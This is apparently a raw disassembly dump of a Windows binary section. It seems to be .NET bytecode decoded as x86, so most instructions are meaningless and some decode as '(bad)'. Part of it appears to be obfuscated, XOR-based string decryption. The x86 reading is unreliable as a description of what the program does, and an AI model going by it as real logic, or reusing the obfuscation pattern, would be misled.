  405412:	2b b1 11 21 17 59    	sub    0x59172111(%ecx),%esi
  405418:	13 20                	adc    (%eax),%esp
  40541a:	2b a9 00 13 15 08    	sub    0x8151300(%ecx),%ebp
  405420:	20 e8                	and    %ch,%al
  405422:	00 00                	add    %al,(%eax)
  405424:	00 58 11             	add    %bl,0x11(%eax)
  405427:	15 1f 50 5a 58       	adc    $0x585a501f,%eax
  40542c:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  40542f:	4a                   	dec    %edx
  405430:	13 17                	adc    (%edi),%edx
  405432:	11 17                	adc    %edx,(%edi)
  405434:	13 18                	adc    (%eax),%ebx
  405436:	00 11                	add    %dl,(%ecx)
  405438:	12 14 3b             	adc    (%ebx,%edi,1),%dl
  40543b:	78 01                	js     0x40543e
  40543d:	00 00                	add    %al,(%eax)
  40543f:	11 12                	adc    %edx,(%edx)
  405441:	16                   	push   %ss
  405442:	9a a5 04 00 00 01 16 	lcall  $0x1601,$0x4a5
  405449:	3b 69 01             	cmp    0x1(%ecx),%ebp
  40544c:	00 00                	add    %al,(%eax)
  40544e:	11 12                	adc    %edx,(%edx)
  405450:	18 9a a5 04 00 00    	sbb    %bl,0x4a5(%edx)
  405456:	01 11                	add    %edx,(%ecx)
  405458:	1c 15                	sbb    $0x15,%al
  40545a:	33 06                	xor    (%esi),%eax
  40545c:	15 38 83 00 00       	adc    $0x8338,%eax
  405461:	00 00                	add    %al,(%eax)
  405463:	08 11                	or     %dl,(%ecx)
  405465:	1c 58                	sbb    $0x58,%al
  405467:	1f                   	pop    %ds
  405468:	28 58 11             	sub    %bl,0x11(%eax)
  40546b:	04 58                	add    $0x58,%al
  40546d:	4a                   	dec    %edx
  40546e:	13 1f                	adc    (%edi),%ebx
  405470:	16                   	push   %ss
  405471:	13 23                	adc    (%ebx),%esp
  405473:	18 13                	sbb    %dl,(%ebx)
  405475:	22 11                	and    (%ecx),%dl
  405477:	23 11                	and    (%ecx),%edx
  405479:	22 58 18             	and    0x18(%eax),%bl
  40547c:	5b                   	pop    %ebx
  40547d:	13 21                	adc    (%ecx),%esp
  40547f:	08 20                	or     %ah,(%eax)
  405481:	e8 00 00 00 58       	call   0x58405486
  405486:	11 21                	adc    %esp,(%ecx)
  405488:	1f                   	pop    %ds
  405489:	50                   	push   %eax
  40548a:	5a                   	pop    %edx
  40548b:	58                   	pop    %eax
  40548c:	1e                   	push   %ds
  40548d:	58                   	pop    %eax
  40548e:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  405491:	4a                   	dec    %edx
  405492:	13 20                	adc    (%eax),%esp
  405494:	08 20                	or     %ah,(%eax)
  405496:	e8 00 00 00 58       	call   0x5840549b
  40549b:	11 21                	adc    %esp,(%ecx)
  40549d:	1f                   	pop    %ds
  40549e:	50                   	push   %eax
  40549f:	5a                   	pop    %edx
  4054a0:	58                   	pop    %eax
  4054a1:	1f                   	pop    %ds
  4054a2:	10 58 11             	adc    %bl,0x11(%eax)
  4054a5:	04 58                	add    $0x58,%al
  4054a7:	4a                   	dec    %edx
  4054a8:	13 08                	adc    (%eax),%ecx
  4054aa:	11 1f                	adc    %ebx,(%edi)
  4054ac:	11 20                	adc    %esp,(%eax)
  4054ae:	11 08                	adc    %ecx,(%eax)
  4054b0:	58                   	pop    %eax
  4054b1:	2f                   	das
  4054b2:	0a 11                	or     (%ecx),%dl
  4054b4:	20 11                	and    %dl,(%ecx)
  4054b6:	1f                   	pop    %ds
  4054b7:	30 0c 11             	xor    %cl,(%ecx,%edx,1)
  4054ba:	21 2b                	and    %ebp,(%ebx)
  4054bc:	10 11                	adc    %dl,(%ecx)
  4054be:	21 17                	and    %edx,(%edi)
  4054c0:	58                   	pop    %eax
  4054c1:	13 23                	adc    (%ebx),%esp
  4054c3:	2b b1 11 21 17 59    	sub    0x59172111(%ecx),%esi
  4054c9:	13 22                	adc    (%edx),%esp
  4054cb:	2b a9 00 13 17 08    	sub    0x8171300(%ecx),%ebp
  4054d1:	20 e8                	and    %ch,%al
  4054d3:	00 00                	add    %al,(%eax)
  4054d5:	00 58 11             	add    %bl,0x11(%eax)
  4054d8:	17                   	pop    %ss
  4054d9:	1f                   	pop    %ds
  4054da:	50                   	push   %eax
  4054db:	5a                   	pop    %edx
  4054dc:	58                   	pop    %eax
  4054dd:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  4054e0:	4a                   	dec    %edx
  4054e1:	13 15 11 15 00 40    	adc    0x40001511,%edx
  4054e7:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4054e8:	00 00                	add    %al,(%eax)
  4054ea:	00 11                	add    %dl,(%ecx)
  4054ec:	16                   	push   %ss
  4054ed:	13 15 00 11 15 11    	adc    0x11151100,%edx
  4054f3:	1c 2e                	sbb    $0x2e,%al
  4054f5:	11 11                	adc    %edx,(%ecx)
  4054f7:	15 15 2e 16 08       	adc    $0x8162e15,%eax
  4054fc:	11 15 58 11 04 58    	adc    %edx,0x58041158
  405502:	4a                   	dec    %edx
  405503:	13 15 2b e8 00 11    	adc    0x1100e82b,%edx
  405509:	09 13                	or     %edx,(%ebx)
  40550b:	05 38 c2 f6 ff       	add    $0xfff6c238,%eax
  405510:	ff 00                	incl   (%eax)
  405512:	08 11                	or     %dl,(%ecx)
  405514:	1c 58                	sbb    $0x58,%al
  405516:	1f                   	pop    %ds
  405517:	10 58 11             	adc    %bl,0x11(%eax)
  40551a:	04 58                	add    $0x58,%al
  40551c:	4a                   	dec    %edx
  40551d:	13 17                	adc    (%edi),%edx
  40551f:	11 17                	adc    %edx,(%edi)
  405521:	15 2e 5b 08 11       	adc    $0x11085b2e,%eax
  405526:	17                   	pop    %ss
  405527:	58                   	pop    %eax
  405528:	1f                   	pop    %ds
  405529:	38 58 11             	cmp    %bl,0x11(%eax)
  40552c:	04 58                	add    $0x58,%al
  40552e:	4a                   	dec    %edx
  40552f:	13 14 1e             	adc    (%esi,%ebx,1),%edx
  405532:	8d 03                	lea    (%ebx),%eax
  405534:	00 00                	add    %al,(%eax)
  405536:	01 13                	add    %edx,(%ebx)
  405538:	13 11                	adc    (%ecx),%edx
  40553a:	13 16                	adc    (%esi),%edx
  40553c:	16                   	push   %ss
  40553d:	8c 04 00             	mov    %es,(%eax,%eax,1)
  405540:	00 01                	add    %al,(%ecx)
  405542:	a2 11 13 17 11       	mov    %al,0x11171311
  405547:	12 a2 11 13 19 11    	adc    0x11191311(%edx),%ah
  40554d:	09 8c 04 00 00 01 a2 	or     %ecx,-0x5dff0000(%esp,%eax,1)
  405554:	11 13                	adc    %edx,(%ebx)
  405556:	18 11                	sbb    %dl,(%ecx)
  405558:	17                   	pop    %ss
  405559:	8c 04 00             	mov    %es,(%eax,%eax,1)
  40555c:	00 01                	add    %al,(%ecx)
  40555e:	a2 11 13 1d 16       	mov    %al,0x161d1311
  405563:	8c 04 00             	mov    %es,(%eax,%eax,1)
  405566:	00 01                	add    %al,(%ecx)
  405568:	a2 11 13 13 12       	mov    %al,0x12131311
  40556d:	08 11                	or     %dl,(%ecx)
  40556f:	17                   	pop    %ss
  405570:	58                   	pop    %eax
  405571:	1f                   	pop    %ds
  405572:	38 58 11             	cmp    %bl,0x11(%eax)
  405575:	04 58                	add    $0x58,%al
  405577:	4a                   	dec    %edx
  405578:	13 05 38 54 f6 ff    	adc    0xfff65438,%eax
  40557e:	ff 00                	incl   (%eax)
  405580:	08 11                	or     %dl,(%ecx)
  405582:	1c 58                	sbb    $0x58,%al
  405584:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  405587:	4a                   	dec    %edx
  405588:	13 1c 38             	adc    (%eax,%edi,1),%ebx
  40558b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40558c:	fe                   	(bad)
  40558d:	ff                   	(bad)
  40558e:	ff 00                	incl   (%eax)
  405590:	11 12                	adc    %edx,(%edx)
  405592:	18 9a a5 04 00 00    	sbb    %bl,0x4a5(%edx)
  405598:	01 11                	add    %edx,(%ecx)
  40559a:	18 33                	sbb    %dh,(%ebx)
  40559c:	09 11                	or     %edx,(%ecx)
  40559e:	09 13                	or     %edx,(%ebx)
  4055a0:	05 38 2d f6 ff       	add    $0xfff62d38,%eax
  4055a5:	ff 00                	incl   (%eax)
  4055a7:	11 12                	adc    %edx,(%edx)
  4055a9:	17                   	pop    %ss
  4055aa:	9a 74 01 00 00 1b 13 	lcall  $0x131b,$0x174
  4055b1:	12 38                	adc    (%eax),%bh
  4055b3:	7f fe                	jg     0x4055b3
  4055b5:	ff                   	(bad)
  4055b6:	ff 00                	incl   (%eax)
  4055b8:	11 16                	adc    %edx,(%esi)
  4055ba:	13 14 00             	adc    (%eax,%eax,1),%edx
  4055bd:	11 14 11             	adc    %edx,(%ecx,%edx,1)
  4055c0:	1c 2e                	sbb    $0x2e,%al
  4055c2:	11 11                	adc    %edx,(%ecx)
  4055c4:	14 15                	adc    $0x15,%al
  4055c6:	2e 16                	cs push %ss
  4055c8:	08 11                	or     %dl,(%ecx)
  4055ca:	14 58                	adc    $0x58,%al
  4055cc:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  4055cf:	4a                   	dec    %edx
  4055d0:	13 14 2b             	adc    (%ebx,%ebp,1),%edx
  4055d3:	e8 00 11 09 13       	call   0x134966d8
  4055d8:	05 38 f5 f5 ff       	add    $0xfff5f538,%eax
  4055dd:	ff 00                	incl   (%eax)
  4055df:	08 11                	or     %dl,(%ecx)
  4055e1:	1c 58                	sbb    $0x58,%al
  4055e3:	1f                   	pop    %ds
  4055e4:	10 58 11             	adc    %bl,0x11(%eax)
  4055e7:	04 58                	add    $0x58,%al
  4055e9:	4a                   	dec    %edx
  4055ea:	13 08                	adc    (%eax),%ecx
  4055ec:	11 08                	adc    %ecx,(%eax)
  4055ee:	15 2e 5b 08 11       	adc    $0x11085b2e,%eax
  4055f3:	08 58 1f             	or     %bl,0x1f(%eax)
  4055f6:	38 58 11             	cmp    %bl,0x11(%eax)
  4055f9:	04 58                	add    $0x58,%al
  4055fb:	4a                   	dec    %edx
  4055fc:	13 20                	adc    (%eax),%esp
  4055fe:	1e                   	push   %ds
  4055ff:	8d 03                	lea    (%ebx),%eax
  405601:	00 00                	add    %al,(%eax)
  405603:	01 13                	add    %edx,(%ebx)
  405605:	13 11                	adc    (%ecx),%edx
  405607:	13 16                	adc    (%esi),%edx
  405609:	16                   	push   %ss
  40560a:	8c 04 00             	mov    %es,(%eax,%eax,1)
  40560d:	00 01                	add    %al,(%ecx)
  40560f:	a2 11 13 17 11       	mov    %al,0x11171311
  405614:	12 a2 11 13 19 11    	adc    0x11191311(%edx),%ah
  40561a:	09 8c 04 00 00 01 a2 	or     %ecx,-0x5dff0000(%esp,%eax,1)
  405621:	11 13                	adc    %edx,(%ebx)
  405623:	18 11                	sbb    %dl,(%ecx)
  405625:	08 8c 04 00 00 01 a2 	or     %cl,-0x5dff0000(%esp,%eax,1)
  40562c:	11 13                	adc    %edx,(%ebx)
  40562e:	1d 16 8c 04 00       	sbb    $0x48c16,%eax
  405633:	00 01                	add    %al,(%ecx)
  405635:	a2 11 13 13 12       	mov    %al,0x12131311
  40563a:	08 11                	or     %dl,(%ecx)
  40563c:	08 58 1f             	or     %bl,0x1f(%eax)
  40563f:	38 58 11             	cmp    %bl,0x11(%eax)
  405642:	04 58                	add    $0x58,%al
  405644:	4a                   	dec    %edx
  405645:	13 05 38 87 f5 ff    	adc    0xfff58738,%eax
  40564b:	ff 00                	incl   (%eax)
  40564d:	08 11                	or     %dl,(%ecx)
  40564f:	1c 58                	sbb    $0x58,%al
  405651:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  405654:	4a                   	dec    %edx
  405655:	13 1c 38             	adc    (%eax,%edi,1),%ebx
  405658:	da fd                	(bad)
  40565a:	ff                   	(bad)
  40565b:	ff 13                	call   *(%ebx)
  40565d:	25 11 24 17 2e       	and    $0x2e172411,%eax
  405662:	0c 11                	or     $0x11,%al
  405664:	25 13 1d 15 13       	and    $0x13151d13,%eax
  405669:	1e                   	push   %ds
  40566a:	dd 20                	frstor (%eax)
  40566c:	f8                   	clc
  40566d:	ff                   	(bad)
  40566e:	ff 11                	call   *(%ecx)
  405670:	25 7a 00 11 11       	and    $0x1111007a,%eax
  405675:	2a 00                	sub    (%eax),%al
  405677:	00 41 1c             	add    %al,0x1c(%ecx)
  40567a:	00 00                	add    %al,(%eax)
  40567c:	00 00                	add    %al,(%eax)
  40567e:	00 00                	add    %al,(%eax)
  405680:	33 00                	xor    (%eax),%eax
  405682:	00 00                	add    %al,(%eax)
  405684:	89 0a                	mov    %ecx,(%edx)
  405686:	00 00                	add    %al,(%eax)
  405688:	bc 0a 00 00 16       	mov    $0x1600000a,%esp
  40568d:	00 00                	add    %al,(%eax)
  40568f:	00 08                	add    %cl,(%eax)
  405691:	00 00                	add    %al,(%eax)
  405693:	01 13                	add    %edx,(%ebx)
  405695:	30 03                	xor    %al,(%ebx)
  405697:	00 51 00             	add    %dl,0x0(%ecx)
  40569a:	00 00                	add    %al,(%eax)
  40569c:	10 00                	adc    %al,(%eax)
  40569e:	00 11                	add    %dl,(%ecx)
  4056a0:	00 fe                	add    %bh,%dh
  4056a2:	09 07                	or     %eax,(%edi)
  4056a4:	00 71 07             	add    %dh,0x7(%ecx)
  4056a7:	00 00                	add    %al,(%eax)
  4056a9:	01 fe                	add    %edi,%esi
  4056ab:	09 06                	or     %eax,(%esi)
  4056ad:	00 71 07             	add    %dh,0x7(%ecx)
  4056b0:	00 00                	add    %al,(%eax)
  4056b2:	01 fe                	add    %edi,%esi
  4056b4:	09 08                	or     %ecx,(%eax)
  4056b6:	00 71 07             	add    %dh,0x7(%ecx)
  4056b9:	00 00                	add    %al,(%eax)
  4056bb:	01 28                	add    %ebp,(%eax)
  4056bd:	14 00                	adc    $0x0,%al
  4056bf:	00 06                	add    %al,(%esi)
  4056c1:	00 20                	add    %ah,(%eax)
  4056c3:	00 00                	add    %al,(%eax)
  4056c5:	00 00                	add    %al,(%eax)
  4056c7:	fe 0e                	decb   (%esi)
  4056c9:	00 00                	add    %al,(%eax)
  4056cb:	fe 09                	decb   (%ecx)
  4056cd:	09 00                	or     %eax,(%eax)
  4056cf:	fe 0c 00             	decb   (%eax,%eax,1)
  4056d2:	00 81 04 00 00 01    	add    %al,0x1000004(%ecx)
  4056d8:	fe 09                	decb   (%ecx)
  4056da:	01 00                	add    %eax,(%eax)
  4056dc:	20 06                	and    %al,(%esi)
  4056de:	00 00                	add    %al,(%eax)
  4056e0:	00 54 fe 09          	add    %dl,0x9(%esi,%edi,8)
  4056e4:	02 00                	add    (%eax),%al
  4056e6:	20 03                	and    %al,(%ebx)
  4056e8:	00 00                	add    %al,(%eax)
  4056ea:	00 54 fe 0c          	add    %dl,0xc(%esi,%edi,8)
  4056ee:	01 00                	add    %eax,(%eax)
  4056f0:	2a 00                	sub    (%eax),%al
  4056f2:	00 00                	add    %al,(%eax)
  4056f4:	13 30                	adc    (%eax),%esi
  4056f6:	02 00                	add    (%eax),%al
  4056f8:	0b 00                	or     (%eax),%eax
  4056fa:	00 00                	add    %al,(%eax)
  4056fc:	00 00                	add    %al,(%eax)
  4056fe:	00 00                	add    %al,(%eax)
  405700:	fe 09                	decb   (%ecx)
  405702:	01 00                	add    %eax,(%eax)
  405704:	20 02                	and    %al,(%edx)
  405706:	00 00                	add    %al,(%eax)
  405708:	00 54 2a 00          	add    %dl,0x0(%edx,%ebp,1)
  40570c:	13 30                	adc    (%eax),%esi
  40570e:	02 00                	add    (%eax),%al
  405710:	0c 00                	or     $0x0,%al
  405712:	00 00                	add    %al,(%eax)
  405714:	00 00                	add    %al,(%eax)
  405716:	00 00                	add    %al,(%eax)
  405718:	00 fe                	add    %bh,%dh
  40571a:	09 00                	or     %eax,(%eax)
  40571c:	00 20                	add    %ah,(%eax)
  40571e:	05 00 00 00 54       	add    $0x54000000,%eax
  405723:	2a 13                	sub    (%ebx),%dl
  405725:	30 06                	xor    %al,(%esi)
  405727:	00 2b                	add    %ch,(%ebx)
  405729:	00 00                	add    %al,(%eax)
  40572b:	00 13                	add    %dl,(%ebx)
  40572d:	00 00                	add    %al,(%eax)
  40572f:	11 1f                	adc    %ebx,(%edi)
  405731:	11 0a                	adc    %ecx,(%edx)
  405733:	1f                   	pop    %ds
  405734:	11 0b                	adc    %ecx,(%ebx)
  405736:	1f                   	pop    %ds
  405737:	11 0b                	adc    %ecx,(%ebx)
  405739:	00 07                	add    %al,(%edi)
  40573b:	16                   	push   %ss
  40573c:	33 05 1f 11 0b 2b    	xor    0x2b0b111f,%eax
  405742:	16                   	push   %ss
  405743:	00 12                	add    %dl,(%edx)
  405745:	00 12                	add    %dl,(%edx)
  405747:	01 12                	add    %edx,(%edx)
  405749:	02 02                	add    (%edx),%al
  40574b:	7e 04                	jle    0x405751
  40574d:	00 00                	add    %al,(%eax)
  40574f:	04 06                	add    $0x6,%al
  405751:	97                   	xchg   %eax,%edi
  405752:	29 14 00             	sub    %edx,(%eax,%eax,1)
  405755:	00 11                	add    %dl,(%ecx)
  405757:	2b e0                	sub    %eax,%esp
  405759:	00 2a                	add    %ch,(%edx)
  40575b:	00 13                	add    %dl,(%ebx)
  40575d:	30 02                	xor    %al,(%edx)
  40575f:	00 1a                	add    %bl,(%edx)
  405761:	00 00                	add    %al,(%eax)
  405763:	00 00                	add    %al,(%eax)
  405765:	00 00                	add    %al,(%eax)
  405767:	00 fe                	add    %bh,%dh
  405769:	09 09                	or     %ecx,(%ecx)
  40576b:	00 71 0e             	add    %dh,0xe(%ecx)
  40576e:	00 00                	add    %al,(%eax)
  405770:	01 6f 0f             	add    %ebp,0xf(%edi)
  405773:	00 00                	add    %al,(%eax)
  405775:	0a 00                	or     (%eax),%al
  405777:	fe 09                	decb   (%ecx)
  405779:	01 00                	add    %eax,(%eax)
  40577b:	20 02                	and    %al,(%edx)
  40577d:	00 00                	add    %al,(%eax)
  40577f:	00 54 2a 00          	add    %dl,0x0(%edx,%ebp,1)
  405783:	00 13                	add    %dl,(%ebx)
  405785:	30 08                	xor    %cl,(%eax)
  405787:	00 97 04 00 00 15    	add    %dl,0x15000004(%edi)
  40578d:	00 00                	add    %al,(%eax)
  40578f:	11 fe                	adc    %edi,%esi
  405791:	09 0c 00             	or     %ecx,(%eax,%eax,1)
  405794:	28 10                	sub    %dl,(%eax)
  405796:	00 00                	add    %al,(%eax)
  405798:	0a 26                	or     (%esi),%ah
  40579a:	20 05 00 00 00 8d    	and    %al,0x8d000000
  4057a0:	07                   	pop    %es
  4057a1:	00 00                	add    %al,(%eax)
  4057a3:	01 25 20 00 00 00    	add    %esp,0x20
  4057a9:	00 20                	add    %ah,(%eax)
  4057ab:	16                   	push   %ss
  4057ac:	00 00                	add    %al,(%eax)
  4057ae:	00 8d 06 00 00 01    	add    %cl,0x1000006(%ebp)
  4057b4:	25 fe 0e 00 00       	and    $0xefe,%eax
  4057b9:	fe 09                	decb   (%ecx)
  4057bb:	05 00 fe 0c 00       	add    $0xcfe00,%eax
  4057c0:	00 81 03 00 00 01    	add    %al,0x1000003(%ecx)
  4057c6:	fe 09                	decb   (%ecx)
  4057c8:	05 00 71 03 00       	add    $0x37100,%eax
  4057cd:	00 01                	add    %al,(%ecx)
  4057cf:	20 00                	and    %al,(%eax)
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 20                	add    %ah,(%eax)
  4057d5:	dd 00                	fldl   (%eax)
  4057d7:	00 00                	add    %al,(%eax)
  4057d9:	20 a5 00 00 00 61    	and    %ah,0x61000000(%ebp)
  4057df:	9d                   	popf
  4057e0:	fe 09                	decb   (%ecx)
  4057e2:	05 00 71 03 00       	add    $0x37100,%eax
  4057e7:	00 01                	add    %al,(%ecx)
  4057e9:	20 01                	and    %al,(%ecx)
  4057eb:	00 00                	add    %al,(%eax)
  4057ed:	00 7f 0f             	add    %bh,0xf(%edi)
  4057f0:	00 00                	add    %al,(%eax)
  4057f2:	04 d3                	add    $0xd3,%al
  4057f4:	20 01                	and    %al,(%ecx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	00 58 47             	add    %bl,0x47(%eax)
  4057fb:	69 20 83 00 00 00    	imul   $0x83,(%eax),%esp
  405801:	61                   	popa
  405802:	9d                   	popf
  405803:	fe 09                	decb   (%ecx)
  405805:	05 00 71 03 00       	add    $0x37100,%eax
  40580a:	00 01                	add    %al,(%ecx)
  40580c:	20 02                	and    %al,(%edx)
  40580e:	00 00                	add    %al,(%eax)
  405810:	00 7f 0f             	add    %bh,0xf(%edi)
  405813:	00 00                	add    %al,(%eax)
  405815:	04 d3                	add    $0xd3,%al
  405817:	20 02                	and    %al,(%edx)
  405819:	00 00                	add    %al,(%eax)
  40581b:	00 58 47             	add    %bl,0x47(%eax)
  40581e:	69 20 91 00 00 00    	imul   $0x91,(%eax),%esp
  405824:	61                   	popa
  405825:	9d                   	popf
  405826:	fe 09                	decb   (%ecx)
  405828:	05 00 71 03 00       	add    $0x37100,%eax
  40582d:	00 01                	add    %al,(%ecx)
  40582f:	20 03                	and    %al,(%ebx)
  405831:	00 00                	add    %al,(%eax)
  405833:	00 7f 0f             	add    %bh,0xf(%edi)
  405836:	00 00                	add    %al,(%eax)
  405838:	04 d3                	add    $0xd3,%al
  40583a:	20 03                	and    %al,(%ebx)
  40583c:	00 00                	add    %al,(%eax)
  40583e:	00 58 47             	add    %bl,0x47(%eax)
  405841:	69 20 39 00 00 00    	imul   $0x39,(%eax),%esp
  405847:	61                   	popa
  405848:	9d                   	popf
  405849:	fe 09                	decb   (%ecx)
  40584b:	05 00 71 03 00       	add    $0x37100,%eax
  405850:	00 01                	add    %al,(%ecx)
  405852:	20 04 00             	and    %al,(%eax,%eax,1)
  405855:	00 00                	add    %al,(%eax)
  405857:	20 6d 00             	and    %ch,0x0(%ebp)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	20 4d 00             	and    %cl,0x0(%ebp)
  40585f:	00 00                	add    %al,(%eax)
  405861:	61                   	popa
  405862:	9d                   	popf
  405863:	fe 09                	decb   (%ecx)
  405865:	05 00 71 03 00       	add    $0x37100,%eax
  40586a:	00 01                	add    %al,(%ecx)
  40586c:	20 05 00 00 00 20    	and    %al,0x20000000
  405872:	82 00 00             	addb   $0x0,(%eax)
  405875:	00 20                	add    %ah,(%eax)
  405877:	af                   	scas   %es:(%edi),%eax
  405878:	00 00                	add    %al,(%eax)
  40587a:	00 61 9d             	add    %ah,-0x63(%ecx)
  40587d:	fe 09                	decb   (%ecx)
  40587f:	05 00 71 03 00       	add    $0x37100,%eax
  405884:	00 01                	add    %al,(%ecx)
  405886:	20 06                	and    %al,(%esi)
  405888:	00 00                	add    %al,(%eax)
  40588a:	00 20                	add    %ah,(%eax)
  40588c:	24 00                	and    $0x0,%al
  40588e:	00 00                	add    %al,(%eax)
  405890:	20 4b 00             	and    %cl,0x0(%ebx)
  405893:	00 00                	add    %al,(%eax)
  405895:	61                   	popa
  405896:	9d                   	popf
  405897:	fe 09                	decb   (%ecx)
  405899:	05 00 71 03 00       	add    $0x37100,%eax
  40589e:	00 01                	add    %al,(%ecx)
  4058a0:	20 07                	and    %al,(%edi)
  4058a2:	00 00                	add    %al,(%eax)
  4058a4:	00 7f 0f             	add    %bh,0xf(%edi)
  4058a7:	00 00                	add    %al,(%eax)
  4058a9:	04 d3                	add    $0xd3,%al
  4058ab:	20 07                	and    %al,(%edi)
  4058ad:	00 00                	add    %al,(%eax)
  4058af:	00 58 47             	add    %bl,0x47(%eax)
  4058b2:	69 20 d3 00 00 00    	imul   $0xd3,(%eax),%esp
  4058b8:	61                   	popa
  4058b9:	9d                   	popf
  4058ba:	fe 09                	decb   (%ecx)
  4058bc:	05 00 71 03 00       	add    $0x37100,%eax
  4058c1:	00 01                	add    %al,(%ecx)
  4058c3:	20 08                	and    %cl,(%eax)
  4058c5:	00 00                	add    %al,(%eax)
  4058c7:	00 7f 0f             	add    %bh,0xf(%edi)
  4058ca:	00 00                	add    %al,(%eax)
  4058cc:	04 d3                	add    $0xd3,%al
  4058ce:	20 08                	and    %cl,(%eax)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	00 58 47             	add    %bl,0x47(%eax)
  4058d5:	69 20 9e 00 00 00    	imul   $0x9e,(%eax),%esp
  4058db:	61                   	popa
  4058dc:	9d                   	popf
  4058dd:	fe 09                	decb   (%ecx)
  4058df:	05 00 71 03 00       	add    $0x37100,%eax
  4058e4:	00 01                	add    %al,(%ecx)
  4058e6:	20 09                	and    %cl,(%ecx)
  4058e8:	00 00                	add    %al,(%eax)
  4058ea:	00 20                	add    %ah,(%eax)
  4058ec:	38 00                	cmp    %al,(%eax)
  4058ee:	00 00                	add    %al,(%eax)
  4058f0:	20 15 00 00 00 61    	and    %dl,0x61000000
  4058f6:	9d                   	popf
  4058f7:	fe 09                	decb   (%ecx)
  4058f9:	05 00 71 03 00       	add    $0x37100,%eax
  4058fe:	00 01                	add    %al,(%ecx)
  405900:	20 0a                	and    %cl,(%edx)
  405902:	00 00                	add    %al,(%eax)
  405904:	00 7f 0f             	add    %bh,0xf(%edi)
  405907:	00 00                	add    %al,(%eax)
  405909:	04 d3                	add    $0xd3,%al
  40590b:	20 0a                	and    %cl,(%edx)
  40590d:	00 00                	add    %al,(%eax)
  40590f:	00 58 47             	add    %bl,0x47(%eax)
  405912:	69 20 1f 00 00 00    	imul   $0x1f,(%eax),%esp
  405918:	61                   	popa
  405919:	9d                   	popf
  40591a:	fe 09                	decb   (%ecx)
  40591c:	05 00 71 03 00       	add    $0x37100,%eax
  405921:	00 01                	add    %al,(%ecx)
  405923:	20 0b                	and    %cl,(%ebx)
  405925:	00 00                	add    %al,(%eax)
  405927:	00 7f 0f             	add    %bh,0xf(%edi)
  40592a:	00 00                	add    %al,(%eax)
  40592c:	04 d3                	add    $0xd3,%al
  40592e:	20 0b                	and    %cl,(%ebx)
  405930:	00 00                	add    %al,(%eax)
  405932:	00 58 47             	add    %bl,0x47(%eax)
  405935:	69 20 ef 00 00 00    	imul   $0xef,(%eax),%esp
  40593b:	61                   	popa
  40593c:	9d                   	popf
  40593d:	fe 09                	decb   (%ecx)
  40593f:	05 00 71 03 00       	add    $0x37100,%eax
  405944:	00 01                	add    %al,(%ecx)
  405946:	20 0c 00             	and    %cl,(%eax,%eax,1)
  405949:	00 00                	add    %al,(%eax)
  40594b:	20 ad 00 00 00 20    	and    %ch,0x20000000(%ebp)
  405951:	ce                   	into
  405952:	00 00                	add    %al,(%eax)
  405954:	00 61 9d             	add    %ah,-0x63(%ecx)
  405957:	fe 09                	decb   (%ecx)
  405959:	05 00 71 03 00       	add    $0x37100,%eax
  40595e:	00 01                	add    %al,(%ecx)
  405960:	20 0d 00 00 00 20    	and    %cl,0x20000000
  405966:	e8 00 00 00 20       	call   0x2040596b
  40596b:	83 00 00             	addl   $0x0,(%eax)
  40596e:	00 61 9d             	add    %ah,-0x63(%ecx)
  405971:	fe 09                	decb   (%ecx)
  405973:	05 00 71 03 00       	add    $0x37100,%eax
  405978:	00 01                	add    %al,(%ecx)
  40597a:	20 0e                	and    %cl,(%esi)
  40597c:	00 00                	add    %al,(%eax)
  40597e:	00 7f 0f             	add    %bh,0xf(%edi)
  405981:	00 00                	add    %al,(%eax)
  405983:	04 d3                	add    $0xd3,%al
  405985:	20 0e                	and    %cl,(%esi)
  405987:	00 00                	add    %al,(%eax)
  405989:	00 58 47             	add    %bl,0x47(%eax)
  40598c:	69 20 a8 00 00 00    	imul   $0xa8,(%eax),%esp
  405992:	61                   	popa
  405993:	9d                   	popf
  405994:	fe 09                	decb   (%ecx)
  405996:	05 00 71 03 00       	add    $0x37100,%eax
  40599b:	00 01                	add    %al,(%ecx)
  40599d:	20 0f                	and    %cl,(%edi)
  40599f:	00 00                	add    %al,(%eax)
  4059a1:	00 20                	add    %ah,(%eax)
  4059a3:	76 00                	jbe    0x4059a5
  4059a5:	00 00                	add    %al,(%eax)
  4059a7:	20 5b 00             	and    %bl,0x0(%ebx)
  4059aa:	00 00                	add    %al,(%eax)
  4059ac:	61                   	popa
  4059ad:	9d                   	popf
  4059ae:	fe 09                	decb   (%ecx)
  4059b0:	05 00 71 03 00       	add    $0x37100,%eax
  4059b5:	00 01                	add    %al,(%ecx)
  4059b7:	20 10                	and    %dl,(%eax)
  4059b9:	00 00                	add    %al,(%eax)
  4059bb:	00 20                	add    %ah,(%eax)
  4059bd:	10 00                	adc    %al,(%eax)
  4059bf:	00 00                	add    %al,(%eax)
  4059c1:	20 79 00             	and    %bh,0x0(%ecx)
  4059c4:	00 00                	add    %al,(%eax)
  4059c6:	61                   	popa
  4059c7:	9d                   	popf
  4059c8:	fe 09                	decb   (%ecx)
  4059ca:	05 00 71 03 00       	add    $0x37100,%eax
  4059cf:	00 01                	add    %al,(%ecx)
  4059d1:	20 11                	and    %dl,(%ecx)
  4059d3:	00 00                	add    %al,(%eax)
  4059d5:	00 20                	add    %ah,(%eax)
  4059d7:	81 00 00 00 20 ef    	addl   $0xef200000,(%eax)
  4059dd:	00 00                	add    %al,(%eax)
  4059df:	00 61 9d             	add    %ah,-0x63(%ecx)
  4059e2:	fe 09                	decb   (%ecx)
  4059e4:	05 00 71 03 00       	add    $0x37100,%eax
  4059e9:	00 01                	add    %al,(%ecx)
  4059eb:	20 12                	and    %dl,(%edx)
  4059ed:	00 00                	add    %al,(%eax)
  4059ef:	00 7f 0f             	add    %bh,0xf(%edi)
  4059f2:	00 00                	add    %al,(%eax)
  4059f4:	04 d3                	add    $0xd3,%al
  4059f6:	20 12                	and    %dl,(%edx)
  4059f8:	00 00                	add    %al,(%eax)
  4059fa:	00 58 47             	add    %bl,0x47(%eax)
